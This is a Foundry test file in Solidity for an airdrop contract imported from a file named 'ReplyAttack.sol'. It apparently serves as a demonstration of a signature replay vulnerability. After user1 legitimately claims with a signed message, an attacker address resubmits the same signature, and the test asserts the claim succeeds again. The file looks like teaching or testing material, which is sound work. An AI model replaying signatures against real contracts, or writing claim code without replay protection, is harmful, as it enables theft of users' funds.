// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {console, Test} from "forge-std/Test.sol";
import {Airdrop} from "../src/ReplyAttack.sol";

contract TestAirdrop is Test {
    Airdrop airdrop;
    uint256 constant CLAIM_AMOUNT = 10 ether;

    address deployer;
    uint256 privateKeyDeployer;

    address user1;
    uint256 user1PrivateKey;

    address attacker;

    function setUp() external {
        (deployer, privateKeyDeployer) = makeAddrAndKey("deployer");

        (user1, user1PrivateKey) = makeAddrAndKey("user");

        vm.prank(deployer);

        airdrop = new Airdrop();
    }

    function test_claim() external {
        string memory message = "\x19Ethereum Signed Message:\n52";
        bytes32 hashMessage = keccak256(
            abi.encodePacked(message, user1, CLAIM_AMOUNT)
        );

        // Sign message
        uint8 v;
        bytes32 r;
        bytes32 s;

        (v, r, s) = vm.sign(user1PrivateKey, hashMessage);
        Airdrop.Signature memory signatureUser1;

        signatureUser1 = Airdrop.Signature(v, r, s);
        vm.startPrank(user1);
        airdrop.claimTokens(CLAIM_AMOUNT, user1, signatureUser1);
        vm.stopPrank();

        vm.startPrank(attacker);
        uint256 beforeBalance = airdrop.getBalance();
        airdrop.claimTokens(CLAIM_AMOUNT, user1, signatureUser1);
        assert(airdrop.getBalance() > beforeBalance);
        vm.stopPrank();
    }
}
